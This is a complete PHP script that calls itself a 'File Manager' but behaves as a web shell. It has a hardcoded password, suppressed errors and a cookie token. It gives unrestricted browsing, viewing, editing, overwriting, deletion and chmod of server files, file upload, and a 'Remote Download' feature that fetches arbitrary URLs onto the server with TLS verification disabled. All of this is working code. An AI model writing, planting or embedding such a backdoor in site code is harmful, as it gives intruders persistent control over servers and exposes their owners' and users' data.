<?php
error_reporting(0);ini_set('display_errors','0');
define('_FMPW','h/\m/\h');
define('_FMCK','_fmx');
define('_FMTK',md5(_FMPW.'!fmk9k2s!'));

function fm_sl($p){return str_replace(chr(92),'/',$p);}
function fm_rp($p){$r=@realpath($p);return($r!==false&&$r!=='')?fm_sl($r):false;}
function fm_sz($n){
    $n=(int)$n;
    if($n>=1073741824)return round($n/1073741824,1).'G';
    if($n>=1048576)return round($n/1048576,1).'M';
    if($n>=1024)return round($n/1024,1).'K';
    return $n.'B';
}
function fm_oc($fp){$m=@fileperms($fp);return($m!==false)?substr(sprintf('%o',$m),-4):'?';}
function fm_prm($fp){
    $m=@fileperms($fp);if($m===false)return '----';$s='';
    foreach(array(256=>'r',128=>'w',64=>'x',32=>'r',16=>'w',8=>'x',4=>'r',2=>'w',1=>'x') as $b=>$c)
        $s.=($m&$b)?$c:'-';
    return fm_oc($fp).' '.$s;
}
function fm_redir($url){header('Location: '.$url);exit;}
function fm_self(){return isset($_SERVER['PHP_SELF'])?$_SERVER['PHP_SELF']:__FILE__;}

/* --- auth via cookie (no session required) --- */
if(isset($_POST['_pw'])&&md5((string)$_POST['_pw'].'!fmk9k2s!')===_FMTK){
    setcookie(_FMCK,_FMTK,0,'/','',false,false);
    fm_redir(fm_self());
}
if(isset($_POST['_lo'])){setcookie(_FMCK,'',0,'/');fm_redir(fm_self());}
$authed=isset($_COOKIE[_FMCK])&&$_COOKIE[_FMCK]===_FMTK;
if(!$authed){
?><!DOCTYPE html><html><head><meta charset="utf-8"><meta name="x-fmid" content="fmk-9k2s">
<title>FM</title><style>
*{box-sizing:border-box}body{margin:0;background:#0d0d0d;display:flex;justify-content:center;
align-items:center;min-height:100vh;font-family:monospace}
.b{background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:36px;min-width:280px}
h3{margin:0 0 18px;color:#ccc;font-weight:400}
input{display:block;width:100%;padding:9px 12px;background:#111;border:1px solid #444;
color:#ddd;border-radius:4px;font-size:14px;margin-bottom:10px}
button{width:100%;padding:9px;background:#1a6fd8;color:#fff;border:none;
border-radius:4px;cursor:pointer;font-size:14px}
</style></head><body><div class="b"><h3>File Manager</h3>
<form method="post"><input type="password" name="_pw" placeholder="Password" autofocus>
<button type="submit">Login</button></form></div></body></html><?php
exit;
}

$me=htmlspecialchars(fm_self());
$dr=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'/';
$cwd_r=isset($_GET['d'])?(string)$_GET['d']:$dr;
$cwd=fm_rp($cwd_r);
if($cwd===false){$cwd=fm_sl($dr);$rr=@realpath($cwd);if($rr!==false)$cwd=fm_sl($rr);}
$msg='';$mok=true;

/* actions */
if(!empty($_FILES['uf']['tmp_name'])&&!empty($_FILES['uf']['name'])){
    $fn=preg_replace('/[^A-Za-z0-9_.+-]/','',(string)$_FILES['uf']['name']);
    if($fn==='')$fn='up_'.time();
    if(move_uploaded_file($_FILES['uf']['tmp_name'],$cwd.'/'.$fn))
        $msg='Uploaded: '.$cwd.'/'.$fn;
    else{$msg='Upload failed';$mok=false;}
}
if(isset($_POST['_nf'])&&(string)$_POST['_nf']!==''){
    $p=$cwd.'/'.basename((string)$_POST['_nf']);
    $r=@file_put_contents($p,'');
    if($r!==false)$msg='Created: '.$p;
    else{$msg='Create failed';$mok=false;}
}
if(isset($_POST['_nd'])&&(string)$_POST['_nd']!==''){
    $p=$cwd.'/'.basename((string)$_POST['_nd']);
    if(@mkdir($p,0755,true))$msg='Dir created: '.$p;
    else{$msg='mkdir failed';$mok=false;}
}
if(!empty($_POST['_del'])){
    $p=fm_rp((string)$_POST['_del']);
    if($p!==false){
        if(is_dir($p)){if(@rmdir($p))$msg='Deleted dir';else{$msg='Delete failed';$mok=false;}}
        else{if(@unlink($p))$msg='Deleted';else{$msg='Delete failed';$mok=false;}}
    }
}
if(!empty($_POST['_rf'])&&!empty($_POST['_rt'])){
    $from=fm_rp((string)$_POST['_rf']);
    if($from!==false){
        $to=dirname($from).'/'.basename((string)$_POST['_rt']);
        if(@rename($from,$to))$msg='Renamed';else{$msg='Rename failed';$mok=false;}
    }
}
if(!empty($_POST['_cp'])&&!empty($_POST['_cv'])){
    $p=fm_rp((string)$_POST['_cp']);
    $v=octdec(preg_replace('/[^0-7]/','',substr((string)$_POST['_cv'],0,4)));
    if($p!==false&&$v>0){if(@chmod($p,$v))$msg='chmod ok';else{$msg='chmod failed';$mok=false;}}
}
if(isset($_POST['_sp'])&&isset($_POST['_sc'])){
    $p=fm_rp((string)$_POST['_sp']);
    if($p!==false&&is_file($p)){
        $r=@file_put_contents($p,(string)$_POST['_sc']);
        if($r!==false)$msg='Saved';else{$msg='Save failed';$mok=false;}
    }
    $back=fm_sl(dirname($p!==false?$p:$cwd));
    fm_redir(fm_self().'?d='.urlencode($back));
}
if(!empty($_POST['_ru'])){
    $url=(string)$_POST['_ru'];
    $fn=basename((string)@parse_url($url,PHP_URL_PATH));
    if(!$fn)$fn='dl_'.time();
    $dst=$cwd.'/'.$fn;$ok=false;
    if(!$ok&&ini_get('allow_url_fopen')){
        $ctx=@stream_context_create(array(
            'http'=>array('timeout'=>30,'follow_location'=>1),
            'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false)));
        $d=@file_get_contents($url,false,$ctx);
        if($d!==false&&strlen($d)>0)$ok=(@file_put_contents($dst,$d)!==false);
    }
    if(!$ok&&function_exists('curl_init')){
        $ch=curl_init($url);
        curl_setopt_array($ch,array(CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,
            CURLOPT_TIMEOUT=>30,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0));
        $d=curl_exec($ch);curl_close($ch);
        if(is_string($d)&&strlen($d)>0)$ok=(@file_put_contents($dst,$d)!==false);
    }
    if(!$ok){
        $fi=@fopen($url,'rb');
        if($fi){$fo=@fopen($dst,'wb');
            if($fo){while(!feof($fi)){fwrite($fo,fread($fi,8192));}fclose($fo);$ok=true;}
            fclose($fi);}
    }
    if($ok)$msg='Downloaded: '.$dst;else{$msg='Download failed';$mok=false;}
}
if(isset($_GET['view'])){
    $p=fm_rp((string)$_GET['view']);
    if($p!==false&&is_file($p)){header('Content-Type: text/plain; charset=utf-8');readfile($p);exit;}
}
if(isset($_GET['dl'])){
    $p=fm_rp((string)$_GET['dl']);
    if($p!==false&&is_file($p)){
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($p).'"');
        readfile($p);exit;
    }
}
if(isset($_GET['edit'])){
    $p=fm_rp((string)$_GET['edit']);
    if($p!==false&&is_file($p)){
        $ec=htmlspecialchars((string)@file_get_contents($p),ENT_QUOTES);
        $ep=htmlspecialchars($p,ENT_QUOTES);
        $back=htmlspecialchars(fm_self().'?d='.urlencode(fm_sl(dirname($p))));
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Edit</title><style>
*{box-sizing:border-box}body{margin:0;padding:14px;background:#0d0d0d;color:#ccc;font-family:monospace}
a{color:#4fc3f7}textarea{width:100%;height:78vh;background:#111;color:#ccc;border:1px solid #444;
padding:10px;font-family:monospace;font-size:13px;border-radius:4px}
button{margin-top:8px;padding:8px 20px;background:#1a6fd8;color:#fff;border:none;border-radius:4px;cursor:pointer}
</style></head><body>';
        echo '<a href="'.$back.'">&lt;-- Back</a> &nbsp; <span style="color:#777;font-size:12px">'.$ep.'</span><br><br>';
        echo '<form method="post"><input type="hidden" name="_sp" value="'.$ep.'">';
        echo '<textarea name="_sc">'.$ec.'</textarea><br>';
        echo '<button type="submit">Save</button></form></body></html>';
        exit;
    }
}

/* list dir */
$entries=array();
$dh=@opendir($cwd);
if($dh){while(($f=readdir($dh))!==false)$entries[]=$f;closedir($dh);}
sort($entries);
$dl=array();$fl=array();
foreach($entries as $e){
    if($e==='.'||$e==='..') continue;
    if(is_dir($cwd.'/'.$e))$dl[]=$e;else $fl[]=$e;
}
$par=fm_sl(dirname($cwd));

/* breadcrumb parts */
$bc=array();$tmp='';
foreach(explode('/',ltrim($cwd,'/')) as $seg){
    if($seg==='')continue;
    $tmp.='/'.$seg;$bc[$seg]=$tmp;
}
?><!DOCTYPE html><html><head><meta charset="utf-8"><title>File Manager</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}body{margin:0;background:#0d0d0d;color:#ccc;font-family:monospace;font-size:13px}
#h{background:#111;border-bottom:1px solid #222;padding:10px 16px;display:flex;justify-content:space-between;align-items:center}
#h b{color:#eee;font-size:15px;font-weight:400}
.w{padding:12px 16px}
.bc{font-size:12px;color:#555;margin-bottom:12px;word-break:break-all}
.bc a{color:#4fc3f7;text-decoration:none}
.msg{padding:8px 12px;border-radius:4px;margin-bottom:10px;font-size:12px}
.ok{background:#0a2a10;border:1px solid #1a4a20;color:#5dba6f}
.er{background:#2a0a0a;border:1px solid #4a1a1a;color:#e06060}
.pnls{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:8px;margin-bottom:12px}
.pnl{background:#141414;border:1px solid #222;border-radius:6px;padding:10px}
.pnl h4{margin:0 0 8px;color:#777;font-size:11px;text-transform:uppercase}
.row{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
input[type=text],input[type=file],input[type=url]{background:#0d0d0d;border:1px solid #2a2a2a;
color:#ccc;padding:5px 8px;border-radius:4px;flex:1;min-width:0;font-family:monospace;font-size:12px}
.b{background:#1a6fd8;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;font-size:12px}
.b:hover{background:#1558b0}.b.g{background:#2a2a2a}.b.g:hover{background:#383838}
.b.r{background:#822}.b.r:hover{background:#a33}
table{width:100%;border-collapse:collapse}
th{text-align:left;color:#444;font-size:11px;padding:5px 8px;border-bottom:1px solid #1a1a1a}
td{padding:4px 8px;border-bottom:1px solid #161616;vertical-align:top}
tr:hover td{background:#111}
.dn{color:#4fc3f7}.fn{color:#ccc}
.pm{font-size:11px;color:#444;font-family:monospace}
.ac{display:flex;gap:3px;flex-wrap:wrap}
.ac a,.ac button{font-size:11px;padding:2px 6px;border-radius:3px}
.hi{display:none}
</style></head><body>
<div id="h"><b>File Manager</b>
<form method="post" style="margin:0"><button class="b g" name="_lo" value="1" type="submit">Logout</button></form>
</div>
<div class="w">
<div class="bc">
<a href="<?php echo $me;?>?d=<?php echo urlencode('/');?>">/</a>
<?php foreach($bc as $seg=>$path):?>
/ <a href="<?php echo $me;?>?d=<?php echo urlencode($path);?>"><?php echo htmlspecialchars($seg);?></a>
<?php endforeach;?>
</div>
<?php if($msg):?>
<div class="msg <?php echo $mok?'ok':'er';?>"><?php echo htmlspecialchars($msg);?></div>
<?php endif;?>
<div class="pnls">
<div class="pnl"><h4>Upload File</h4>
<form method="post" enctype="multipart/form-data">
<div class="row"><input type="file" name="uf"><button class="b" type="submit">Upload</button></div>
</form></div>
<div class="pnl"><h4>New File / Dir</h4>
<form method="post" style="margin-bottom:5px"><div class="row">
<input type="text" name="_nf" placeholder="file.txt"><button class="b" type="submit">File</button></div></form>
<form method="post"><div class="row">
<input type="text" name="_nd" placeholder="dirname"><button class="b" type="submit">Dir</button></div></form>
</div>
<div class="pnl"><h4>Remote Download</h4>
<form method="post"><div class="row">
<input type="url" name="_ru" placeholder="https://host/file">
<button class="b" type="submit">Fetch</button></div></form>
<div style="font-size:10px;color:#333;margin-top:4px">fopen / curl / file_get_contents</div>
</div>
</div>
<table>
<tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr>
<?php if($par!==$cwd):?>
<tr><td colspan="5"><a class="dn" href="<?php echo $me;?>?d=<?php echo urlencode($par);?>">[..]</a></td></tr>
<?php endif;?>
<?php foreach(array_merge($dl,$fl) as $e):
    $fp=$cwd.'/'.$e;
    $isd=is_dir($fp);
    $sz=$isd?'':fm_sz((int)@filesize($fp));
    $mt=@filemtime($fp);
    $mts=$mt?date('Y-m-d H:i',$mt):'';
    $prm=fm_prm($fp);
    $oc=fm_oc($fp);
    $es=htmlspecialchars($fp,ENT_QUOTES);
    $eu=urlencode($fp);
    $en=htmlspecialchars($e);
    $rid='r'.md5($fp);$cid='c'.md5($fp);
?>
<tr>
<td><?php if($isd):?>
<a class="dn" href="<?php echo $me;?>?d=<?php echo $eu;?>">[<?php echo $en;?>]</a>
<?php else:?><span class="fn"><?php echo $en;?></span><?php endif;?></td>
<td><?php echo $sz;?></td>
<td><?php echo $mts;?></td>
<td class="pm"><?php echo htmlspecialchars($prm);?></td>
<td><div class="ac">
<?php if(!$isd):?>
<a class="b g" href="<?php echo $me;?>?edit=<?php echo $eu;?>">edit</a>
<a class="b g" href="<?php echo $me;?>?view=<?php echo $eu;?>" target="_blank">raw</a>
<a class="b g" href="<?php echo $me;?>?dl=<?php echo $eu;?>">dl</a>
<?php endif;?>
<button class="b g" onclick="document.getElementById('<?php echo $rid;?>').style.display='inline-flex'">ren</button>
<button class="b g" onclick="document.getElementById('<?php echo $cid;?>').style.display='inline-flex'">chmod</button>
<form method="post" style="display:inline">
<button class="b r" name="_del" value="<?php echo $es;?>" type="submit"
onclick="return confirm('Delete <?php echo addslashes($en);?>?')">del</button></form>
</div>
<span id="<?php echo $rid;?>" class="hi" style="display:none">
<form method="post" style="display:inline-flex;gap:4px;align-items:center">
<input type="hidden" name="_rf" value="<?php echo $es;?>">
<input type="text" name="_rt" value="<?php echo $en;?>" style="width:120px">
<button class="b" type="submit">OK</button></form></span>
<span id="<?php echo $cid;?>" class="hi" style="display:none">
<form method="post" style="display:inline-flex;gap:4px;align-items:center">
<input type="hidden" name="_cp" value="<?php echo $es;?>">
<input type="text" name="_cv" value="<?php echo $oc;?>" style="width:55px">
<button class="b" type="submit">OK</button></form></span>
</td></tr>
<?php endforeach;?>
</table>
</div>
</body></html>
